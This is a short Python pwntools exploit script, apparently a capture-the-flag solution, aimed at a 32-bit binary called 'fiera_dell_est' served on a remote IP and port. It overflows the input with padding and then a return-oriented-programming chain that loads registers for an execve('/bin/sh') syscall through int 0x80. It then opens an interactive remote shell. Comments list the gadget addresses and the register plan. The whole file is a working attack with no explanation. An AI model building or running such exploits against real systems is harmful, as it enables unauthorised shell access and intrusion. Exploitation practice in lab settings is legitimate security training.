from pwn import *
import sys

#########################################################
BINARY="./fiera_dell_est"
ENV={}
GDB="break *main"
HOST="46.101.199.176"
PORT=8001
#########################################################
# r = process(BINARY)
r = remote(HOST, PORT)
binary = ELF(BINARY)

# Wait for debugger
# pid = util.proc.pidof(r)[0]
# print("The pid is: "+str(pid))
# util.proc.wait_for_debugger(pid)

# gdb.attach(r)

# EAX = 0xb
# EBX = "pointer to /bin/sh"
# ECX = EDX = 0





"""
0x0804851d  -- pop eax;
0x0804851f  -- mov ecx, eax;
0x08048522  -- pop edi;
0x08048524  -- pop esi;
0x08048526  -- pop ebx;
0x08048528  -- pop edx;
0x0804852a  -- pop eac; pop ecx; ret;
0x08048530  -- pop ecx; ret;
0x0804852d  -- int 0x80; ret;


0x0804851d  -- pop eax;
0x0b
0x08048526  -- pop ebx;
0x0804a02c     /bin/sh
0x08048530  -- pop ecx; ret;
0x0
0x08048528  -- pop edx;
0x0
0x0804852d  -- int 0x80; ret;

"""


exploit = ("due\x00"+"a"*12).encode()+ p32(0x0804851d) + p32(0x0b) + p32(0x08048526) + p32(0x0804a02c) + p32(0x08048530) + p32(0x0) + p32(0x08048528) + p32(0x0) + p32(0x0804852d)

print(exploit)

r.sendline(exploit)
r.interactive()

